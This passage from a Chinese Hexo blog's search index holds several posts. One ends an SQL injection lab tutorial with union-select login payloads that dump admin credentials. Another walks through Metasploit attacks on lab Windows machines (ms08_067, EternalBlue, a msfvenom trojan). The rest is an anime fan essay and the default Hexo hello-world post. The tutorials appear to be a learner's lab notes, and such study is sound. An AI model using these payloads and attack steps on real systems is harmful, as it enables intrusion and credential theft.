href="https://i.loli.net/2019/10/12/eXykOGPu6CRo2cY.png" target="_blank" rel="noopener">https://i.loli.net/2019/10/12/eXykOGPu6CRo2cY.png</a>)</p><p>表名为admin</p><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：0<span class="string">' union select (select column_name from information_schema.columns where table_name='</span>admin<span class="string">' limit 0,1),(select column_name from information_schema.columns where table_name='</span>admin<span class="string">' limit 1,2)#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/12/nuq1vxTB3s5HzXd.png" alt="9KK6GFE1E52BIZXKGB90_NS.png"></p><p>列名为name,passward</p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' union select name,passward from admin#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/12/X5vC8eqN9zmx3MI.png" alt="M_8AP5UDLU_F3~Z2_E_GTGN.png"></p><p>得到用户名及密码</p><p>（建表的时候把password拼错了）😂</p><h2 id="三、注入漏洞修补"><a href="#三、注入漏洞修补" class="headerlink" title="三、注入漏洞修补"></a>三、注入漏洞修补</h2><p>由于select语句并没有对输入的用户名进行检测，而是拿来直接用，造成的注入漏洞，可以对输入的用户名进行长度限制，或者过滤。</p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf攻击windows</title>
      <link href="/2019/10/11/msf%E6%94%BB%E5%87%BBwindows/"/>
      <url>/2019/10/11/msf%E6%94%BB%E5%87%BBwindows/</url>
      
        <content type="html"><![CDATA[<p>利用msf对windows进行渗透攻击。</p><a id="more"></a><h3 id="一、利用ms08-067攻击xp系统"><a href="#一、利用ms08-067攻击xp系统" class="headerlink" title="一、利用ms08_067攻击xp系统"></a>一、利用ms08_067攻击xp系统</h3><p>在kali终端输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>进入metasploit</p><p>首先搜索这个漏洞</p><p><img src="https://i.loli.net/2019/10/11/TYr2QaiVyvt3qgk.png" alt="img"></p><p>然后使用模块</p><p><img src="https://i.loli.net/2019/10/11/yqzmjCSAQs5ut1v.png" alt="1570774772837.png"></p><p>查看选项</p><p><img src="https://i.loli.net/2019/10/11/uYgbNxznvICAZj4.png" alt="1570774821418.png"></p><p>设置目标IP和自身IP，及被攻击系统版本</p><p><img src="https://i.loli.net/2019/10/11/eOyJq6vrc1FHaTi.png" alt="1570774842853.png"></p><p>直接攻击返回shell</p><p><img src="https://i.loli.net/2019/10/11/OG6U3VBuPDmjXiZ.png" alt="1570774863433.png"></p><h3 id="二、利用永恒之蓝（ms17-010）攻击win7"><a href="#二、利用永恒之蓝（ms17-010）攻击win7" class="headerlink" title="二、利用永恒之蓝（ms17_010）攻击win7"></a>二、利用永恒之蓝（ms17_010）攻击win7</h3><p>首先搜索该漏洞</p><p><img src="https://i.loli.net/2019/10/11/YL2M6Bg4Ea53UuT.png" alt="1570775052329.png"></p><p>使用该漏洞模块</p><p><img src="https://i.loli.net/2019/10/11/SB67eQfACtVNEi5.png" alt="1570775067326.png"></p><p>设置目标IP和自身IP，目标系统默认</p><p><img src="https://i.loli.net/2019/10/11/SG7B8jTY4wJEdeq.png" alt="1570775084979.png"></p><p>攻击</p><p><img src="https://i.loli.net/2019/10/11/QPCDKlauMRiBkVF.png" alt="1570775102714.png"></p><p>攻击成功，建立会话</p><p><img src="https://i.loli.net/2019/10/11/syqNVSBMngj6Lte.png" alt="1570775118532.png"></p><p>打开绘画，进入shell</p><p><img src="https://i.loli.net/2019/10/11/j2eFv5pHhGl1s9c.png" alt="1570775133539.png"></p><h3 id="三、利用metasploit渗透win10"><a href="#三、利用metasploit渗透win10" class="headerlink" title="三、利用metasploit渗透win10"></a>三、利用metasploit渗透win10</h3><p>首先通过msfvenom生成木马文件，并放入win10靶机中</p><p><img src="https://i.loli.net/2019/10/11/fgZqWSzw23VE16C.png" alt="1570775167414.png"></p><p><img src="https://i.loli.net/2019/10/11/36zEv4dnSTLkPWK.png" alt="1570775173831.png"></p><p>然后在kali上开启监听</p><p><img src="https://i.loli.net/2019/10/11/LZNRcP2FI1gbWdX.png" alt="1570775193761.png"></p><p>然后在win10靶机上运行木马程序，监听便能收到，获取shell</p><p><img src="https://i.loli.net/2019/10/11/ojzsxW6egnldpTV.png" alt="1570775209578.png"></p><p>攻击完成。</p><p>以上三个攻击均拿到了shell便可以在对方机器上设置远程用户，然后就可以通过本机的Windows系统远程登陆被攻击的机器，也可以记录对方的键盘记录，远程关机等等</p>]]></content>
      
      
      <categories>
          
          <category> 渗透攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一天是不良人，一辈子都是不良人</title>
      <link href="/2019/10/11/%E4%B8%80%E5%A4%A9%E6%98%AF%E4%B8%8D%E8%89%AF%E4%BA%BA%EF%BC%8C%E4%B8%80%E8%BE%88%E5%AD%90%E9%83%BD%E6%98%AF%E4%B8%8D%E8%89%AF%E4%BA%BA/"/>
      <url>/2019/10/11/%E4%B8%80%E5%A4%A9%E6%98%AF%E4%B8%8D%E8%89%AF%E4%BA%BA%EF%BC%8C%E4%B8%80%E8%BE%88%E5%AD%90%E9%83%BD%E6%98%AF%E4%B8%8D%E8%89%AF%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<p>不良帅：臣尽力了！</p><a id="more"></a><p>作者：<a href="https://www.zhihu.com/people/apocalypse-50" target="_blank" rel="noopener">Apocalypse</a></p><p>这个结局真的很完美，我所说的完美不是指合家欢式的完美，而是逻辑上，剧情上和顺应历史的完美，真的很佩服编剧的想象力和创造力。</p><p>根据朱温篡唐称帝，朱友贞即位后梁被灭，还有李存勖称帝的情节，我大致可以得出结论，不良人的动画走势还是会顺应历史事实的，而且李星云这个昭宗第十子确有其人，历史上的确是被老太监救下来，并且改名换姓，叫做胡昌翼，隐居在考水，后来这个地方成为了明经胡氏的发源地，而这个活下来的皇子也就成了胡氏先祖，被称作明经胡公，是<a href="https://www.zhihu.com/search?q=胡适&source=Entity&hybrid_search_source=Entity&hybrid_search_extra={" sourcetype"%3a"answer"%2c"sourceid"%3a851998364}" target="_blank" rel="noopener">胡适</a>，<a href="https://www.zhihu.com/search?q=胡雪岩&source=Entity&hybrid_search_source=Entity&hybrid_search_extra={" sourcetype"%3a"answer"%2c"sourceid"%3a851999316}" target="_blank" rel="noopener">胡雪岩</a>等人的先祖。</p><p>那么根据历史，李星云最终肯定是无法称帝的，最后继承后唐之位的是李嗣源，肯定也是他拿走了传国玉玺，历史上的由和氏璧雕琢而成的，代表皇权正统，自秦传下的传国玉玺就是在后唐末帝李从珂手中丢失的。同时由少数民族建立的政权契丹，首领也是剧中出现过的耶律阿保机。所以无论如何，李星云不可能继承大统，所以之前我猜测的结局是他将不良帅引入，并最终二人同归于尽，亦或者合众人之力将不良帅灭尽，并最终归隐山林（符合史实）。无论是哪种我臆想的结局，都把不良帅当作了最后的反派，而上一集的预告也预示着不良帅的反叛。可谁成想，最终为了大唐国运而牺牲自己的，却是他。从敬新磨说出不良帅必死的卦象后，我就猜测到了不良帅的死，但从未想过是以一种忠诚，以一种近乎献祭的方式，告别了这个他存在了300多年的世界。虽然无数种卦象都表明，李星云不可能称帝，但是不良帅近乎偏执的心理，硬是花费了几十年的布局，最终以自己的死为句号，终究是打开了一丝李星云去逐鹿天下的可能。怎么说呢，其实从第一季到第三季39集，我都一直不是很认可这个角色，毕竟他所展现出来的强大实力和飞扬跋扈，就像古代傀儡皇帝身边的权臣一般，让人感觉很不舒服。但是最终，通过这一季，我终于理解这个角色存在的意义和其身上的矛盾了。作为一个能够以一己之力影响数十年局势的人，想要扶植任何一个人登上帝位或者自己登上帝位，都是不费吹灰之力的事情，可是不良帅哪怕是活了300年，心里还是那份对大唐的愚忠。本来我还在怀疑，是因为当初和<a href="https://www.zhihu.com/search?q=李淳风&source=Entity&hybrid_search_source=Entity&hybrid_search_extra={" sourcetype"%3a"answer"%2c"sourceid"%3a851998364}" target="_blank" rel="noopener">李淳风</a>关于卦象和大唐气运的争执，才导致他这个好胜且偏执的人一直坚持到现在，只为了和李淳风，或者说天命一争高下。但在他饱含深情的对大唐诸帝一一告别时，我能感受到，袁天罡已经把自己的命运，自己的一切，都和大唐联系起来了。</p><p>其实在几十年前布局时，甚至一百多年前构思布局时，亦或者在300年前，他得出卦象之时，就已经确定了他的死期。有一种执着，叫做明知自己已经定格的命运，却还要试图去为大唐做些什么；明知大唐早已衰败，却竭尽全力为国运再续多年；明知达成自己最终的目的希望渺茫，甚至概率为万分之一，也不惜一试，哪怕徒劳地献出自己的一切。他为大唐所献出的，已经完全不止一条命了，而是一个人所拥有的全部，所能够献出的一切。他可以为了保全大唐逆天而行，在世上苟活数百年，尝尽一切人间冷暖；可以为了大唐面容全毁，感官丧失；可以为了大唐而精心布局，用自己必死换得一丝可能，甚至……..不良帅早就知道，大唐的命运已经终结，而自己所做的，无非是用自己的一切，去偿还先帝们的恩情罢了。</p><p>对于天下的所有人，他是恐惧和残忍的化身，可对于大唐帝位上的诸宗，他就是千古忠臣，忠于皇室，忠于江山，忠于大唐，甚至，比之众位帝王，他才是大唐的化身。从未僭越，恪守信条，愚忠入骨</p><p>我愿於天穷，琅邪倾侧左。</p><p>虽欲竭忠诚，欣公归其楚。</p><p>快人由为叹，抱情不得叙。</p><p>显行天教人，谁知莫不绪。</p><p>我愿何时随，此叹亦难处。</p><p>今我将何照於光曜，释衔不如雨。</p><p>“臣尽力了”</p><p>作者：<a href="https://www.zhihu.com/people/dxbofdream" target="_blank" rel="noopener">DXBofDream</a></p><p>世间万事，风云变幻，苍黄翻覆，纵使波橘云诡，</p><p>但制心一处，便无事不办。</p><p>天定胜人，人定兮胜天。</p><p>依山傍水房树间，行也安然，坐也安然； </p><p>一头耕牛半顷田，收也凭天，荒也凭天。 </p><p>雨过天晴驾小船，鱼在一边，酒在一边； </p><p>路逢骚客问诗篇，好也几言，歹也几言。</p><p>布衣得暖胜丝棉，新也可穿，旧也可穿。 </p><p>粗茶淡饭饱三餐，早也香甜，晚也香甜； </p><p>闲暇无事鉴书篇，名也不贪，利也不贪。 </p><p>夜归挚友话灯前，今也谈谈，古也谈谈； </p><p>一觉睡到日三竿，不是神仙，胜似神仙。</p><p><img src="https://pic4.zhimg.com/80/v2-229fddcc2842d2e601bd5b45e0214259_hd.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 生活日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动漫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/10/10/hello-world/"/>
      <url>/2019/10/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
